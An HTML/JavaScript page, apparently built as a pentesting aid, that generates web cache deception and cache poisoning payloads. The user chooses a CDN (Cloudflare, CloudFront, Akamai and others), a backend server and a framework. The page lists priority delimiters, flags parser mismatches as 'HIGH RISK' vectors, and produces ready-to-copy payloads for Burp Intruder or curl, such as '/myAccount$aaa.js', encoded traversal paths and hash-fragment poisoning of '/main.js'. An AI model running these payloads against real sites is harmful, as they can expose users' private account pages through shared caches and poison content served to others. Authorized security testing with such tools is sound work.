<!--
cache_test_webpage.html
Single-file interactive page (glowy pink on black) to generate cache-testing payloads and guidance.
Usage: open index.html in browser or host on GitHub Pages (push this file to repo root, enable Pages).

Deployment: create a new GitHub repo, add this file as index.html in root, commit and push. In repo Settings -> Pages, select branch main and / (root) as source. The page will be available at https://<username>.github.io/<repo>/
-->

<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>Cache Test Generator — Neon Pink</title>
  <style>
    :root{
      --bg:#070006; /* near black */
      --pink:#ff2fa6;
      --soft-pink:rgba(255,47,166,0.12);
      --glass:rgba(255,47,166,0.06);
      --card:#0f0720;
      --muted:#c7b7d1;
    }
    html,body{height:100%;margin:0;background:linear-gradient(180deg,var(--bg),#000);font-family:Inter,system-ui,Segoe UI,Arial;}
    .app{min-height:100vh;display:flex;align-items:center;justify-content:center;padding:28px}
    .card{width:100%;max-width:1100px;background:linear-gradient(180deg,rgba(255,255,255,0.02),transparent);border-radius:14px;padding:22px;border:1px solid rgba(255,47,166,0.09);box-shadow:0 8px 36px rgba(0,0,0,0.8);backdrop-filter:blur(6px)}
    h1{color:var(--pink);text-shadow:0 0 18px rgba(255,47,166,0.28);margin:0 0 6px;font-size:22px}
    p.lead{color:var(--muted);margin:0 0 18px;font-size:13px}
    .grid{display:grid;grid-template-columns:repeat(3,1fr);gap:12px;margin-bottom:14px}
    label{display:block;color:var(--muted);font-size:12px;margin-bottom:6px}
    .select, .input{width:100%;padding:10px;border-radius:8px;background:var(--card);border:1px solid rgba(255,255,255,0.03);color:#fff;font-size:13px}
    .btn-row{display:flex;gap:8px;align-items:center}
    .btn{background:linear-gradient(90deg,var(--pink),#ff79c9);border:none;color:#081;cursor:pointer;padding:10px 12px;border-radius:9px;font-weight:600;box-shadow:0 6px 18px rgba(255,47,166,0.12);}
    .btn.secondary{background:transparent;border:1px solid rgba(255,47,166,0.12);color:var(--muted);font-weight:600}
    .output{background:#06040a;border-radius:10px;padding:14px;border:1px solid rgba(255,47,166,0.06);color:var(--muted);font-size:13px}
    pre{white-space:pre-wrap;margin:0;color:#ffe6fb}
    .section-title{color:var(--pink);font-weight:700;font-size:13px;margin:8px 0}
    .tag{display:inline-block;padding:6px 8px;border-radius:999px;background:var(--soft-pink);color:var(--pink);font-weight:700;margin-right:6px;font-size:12px}
    .cols{display:grid;grid-template-columns:1fr 1fr;gap:10px}
    .copy{float:right;background:transparent;border:1px solid rgba(255,255,255,0.04);padding:6px 8px;border-radius:6px;color:var(--muted);cursor:pointer}
    footer{margin-top:12px;color:#8a7aa1;font-size:12px}
    .payload-list{max-height:360px;overflow:auto;padding-right:6px}
    @media(max-width:900px){.grid{grid-template-columns:1fr;}.cols{grid-template-columns:1fr}}
  </style>
</head>
<body>
  <div class="app">
    <div class="card">
      <h1>Cache Test Generator</h1>
      <p class="lead">Enter CDN / Backend / Framework → get prioritized delimiters, normalization checks, and ready-to-run payloads.</p>

      <div class="grid">
        <div>
          <label>CDN</label>
          <select id="cdn" class="select">
            <option value="cloudflare">Cloudflare</option>
            <option value="cloudfront">CloudFront</option>
            <option value="azure">Azure</option>
            <option value="fastly">Fastly</option>
            <option value="imperva">Imperva</option>
            <option value="gcp">GCP</option>
            <option value="akamai">Akamai</option>
          </select>
        </div>
        <div>
          <label>Backend Server</label>
          <select id="backend" class="select">
            <option value="nginx">Nginx</option>
            <option value="apache">Apache</option>
            <option value="iis">IIS</option>
            <option value="gunicorn">Gunicorn</option>
            <option value="openlite">OpenLite</option>
            <option value="puma">Puma</option>
          </select>
        </div>
        <div>
          <label>Framework</label>
          <select id="framework" class="select">
            <option value="flask">Flask</option>
            <option value="django">Django</option>
            <option value="rails">Rails</option>
            <option value="spring">Spring</option>
            <option value="express">Express</option>
            <option value="laravel">Laravel</option>
          </select>
        </div>
      </div>

      <div class="btn-row" style="margin-bottom:12px">
        <button id="go" class="btn">Generate</button>
        <button id="download" class="btn secondary">Download payloads</button>
        <button id="reset" class="btn secondary">Reset</button>
      </div>

      <div class="cols">
        <div>
          <div class="section-title">Priority delimiters & encodings</div>
          <div id="delims" class="output"></div>

          <div class="section-title">Normalization checks</div>
          <div id="norms" class="output"></div>

          <div class="section-title">Framework notes</div>
          <div id="fnotes" class="output"></div>
        </div>

        <div>
          <div style="display:flex;align-items:center;justify-content:space-between">
            <div class="section-title">Generated payloads</div>
            <button id="copyAll" class="copy">Copy all</button>
          </div>
          <div id="payloads" class="output payload-list"><pre id="payloadText">(none)</pre></div>
        </div>
      </div>

      <footer>Neon UI • Compact payloads are safe to copy to Burp Intruder or curl. For #-tests use non-browser proxy flows.</footer>
    </div>
  </div>

  <script>
    // small mapping consistent with the Python script
    const CDN_MAP = {
      cloudflare: {hash_delim:false, normalizes:false, decodes:false},
      cloudfront: {hash_delim:true, normalizes:true, decodes:true},
      gcp: {hash_delim:null, normalizes:false, decodes:null},
      azure: {hash_delim:true, normalizes:true, decodes:true},
      imperva: {hash_delim:false, normalizes:true, decodes:false},
      fastly: {hash_delim:false, normalizes:false, decodes:false},
      akamai: {hash_delim:null, normalizes:null, decodes:null}
    };

    const BACKEND_MAP = {
      apache:{hash_delim:'error', normalizes:true},
      nginx:{hash_delim:true, normalizes:false},
      iis:{hash_delim:'error', normalizes:true},
      gunicorn:{hash_delim:true, normalizes:true},
      openlite:{hash_delim:false, normalizes:false},
      puma:{hash_delim:true, normalizes:true}
    };

    const FRAMEWORK_MAP = {
      spring:{semicolon:true, dot:false},
      rails:{dot:true},
      django:{dot:false},
      flask:{dot:true},
      express:{dot:false},
      laravel:{dot:true}
    };

    const STATIC_EXT = ['.js','.css','.png','.jpg','.jpeg','.svg','.woff','.woff2','.pdf'];

    function payloadStaticExt(user_path='/myAccount'){
      const out=[];
      for(const ext of STATIC_EXT){out.push(user_path+'$aaa'+ext);out.push(user_path+'%24aaa'+ext);}return out;
    }
    function payloadStaticDir(user_path='/myAccount'){return [user_path+'$..%2Fstatic%2Fshell',user_path+'%24..%2Fstatic%2Fshell',user_path+'$..%2Fassets%2Fmain.js'];}
    function payloadDotSegment(target='/home'){return ['/random/..%2F'+target.replace(/^\//,''),'/random/../'+target.replace(/^\//,''),'/tmp/.%2e/'+target.replace(/^\//,'')];}
    function payloadHashPoison(popular='/main.js',poisoned='/../home'){return [popular+'# '+poisoned,popular+'#%2F..%2F'+poisoned.replace(/^\//,''),popular+'#/..'+poisoned,popular+'#/../'+poisoned.replace(/^\//,'')];}
    function payloadBackendDelim(backend_delim='$',target='/home'){return ['/backend'+backend_delim+'../'+target.replace(/^\//,''),'/backend'+backend_delim+'%2E%2E%2F'+target.replace(/^\//,'')];}

    function detectBehavior(cdn,backend,framework){
      const cdn_k = CDN_MAP[cdn];
      const b_k = BACKEND_MAP[backend];
      const f_k = FRAMEWORK_MAP[framework];
      const report={cdn,backend,framework};
      // hash delim
      if(cdn_k && b_k){
        const cdn_hash = cdn_k.hash_delim;
        const backend_hash = b_k.hash_delim;
        if(cdn_hash===true && backend_hash===true) report.hash='both-parsers-hash';
        else if(cdn_hash===false && backend_hash===true) report.hash='backend-hashes-cdn-ignores -> HIGH RISK';
        else if(cdn_hash===true && backend_hash===false) report.hash='cdn-hashes-backend-ignores -> unusual';
        else report.hash='unknown';
      } else report.hash='unknown';
      // dot mismatch
      if(b_k && cdn_k){
        if(b_k.normalizes && !cdn_k.normalizes) report.dot='origin-normalizes,cdn-not -> static-dir vector';
        else if(!b_k.normalizes && cdn_k.normalizes) report.dot='cdn-normalizes,origin-not -> different vector';
        else report.dot='same or unknown';
      } else report.dot='same or unknown';

      report.framework_notes=[];
      if(f_k){ if(f_k.semicolon) report.framework_notes.push('spring-matrix-params: try semicolon'); if(f_k.dot) report.framework_notes.push('dot-as-format: static-ext tricks likely'); }
      return report;
    }

    function generate(){
      const cdn = document.getElementById('cdn').value;
      const backend = document.getElementById('backend').value;
      const framework = document.getElementById('framework').value;
      const r = detectBehavior(cdn,backend,framework);

      // delimiters
      const delims = ['%23 (encoded #)', '# (fragment)', '$ (dollar)', '; (semicolon)', '. (dot/format)', '%00 (null)', '%0A (newline)', '%2E%2E (..)', '%2F (slash encoded)', '%5C (backslash encoded)'];
      document.getElementById('delims').innerHTML = '<strong>Priority order (try top→down):</strong> <br>' + delims.map(d=>'<span class="tag">'+d+'</span>').join(' ');

      // norms
      const norms = [
        '1) Base: GET /home (is it cached? check X-Cache, CF-Cache-Status)',
        '2) Encoded vs plain: GET /%68%6f%6d%65 vs /home',
        '3) Dot-seg: GET /aaa/../home  and /aaa/.%2e/home',
        '4) Encoded slash/backslash: /a%2F..%2Fhome  /a%5C..%5Chome'
      ];
      document.getElementById('norms').innerHTML = norms.map(n=>'<div style="margin-bottom:6px">'+n+'</div>').join('');

      // framework notes
      document.getElementById('fnotes').innerHTML = '<strong>Hash effect:</strong> '+r.hash+'<br><strong>Dot mismatch:</strong> '+r.dot + (r.framework_notes.length?('<br><strong>Framework:</strong> '+r.framework_notes.join('; ')):'');

      // payloads
      const payloads = [];
      payloads.push('-- Static extension deception --'); payloads.push(...payloadStaticExt('/myAccount'));
      payloads.push(''); payloads.push('-- Static directory deception --'); payloads.push(...payloadStaticDir('/myAccount'));
      payloads.push(''); payloads.push('-- Dot-segment tests --'); payloads.push(...payloadDotSegment('/home'));
      payloads.push(''); payloads.push('-- Hash/frame poisoning tests --'); payloads.push(...payloadHashPoison('/main.js','/home'));
      payloads.push(''); payloads.push('-- Backend delimiter tests --'); payloads.push(...payloadBackendDelim('$','/home'));

      const text = payloads.join('\n');
      document.getElementById('payloadText').textContent = text;
    }

    // interaction
    document.getElementById('go').addEventListener('click', ()=>generate());
    document.getElementById('reset').addEventListener('click', ()=>{document.getElementById('payloadText').textContent='(none)';document.getElementById('delims').innerHTML='';document.getElementById('norms').innerHTML='';document.getElementById('fnotes').innerHTML='';});
    document.getElementById('copyAll').addEventListener('click', ()=>{navigator.clipboard.writeText(document.getElementById('payloadText').textContent);});
    document.getElementById('download').addEventListener('click', ()=>{
      const blob = new Blob([document.getElementById('payloadText').textContent],{type:'text/plain'});
      const url = URL.createObjectURL(blob);
      const a = document.createElement('a'); a.href=url; a.download='payloads.txt'; a.click(); URL.revokeObjectURL(url);
    });

    // small UX: generate default on load
    window.addEventListener('load', ()=>{generate();});
  </script>
</body>
</html>
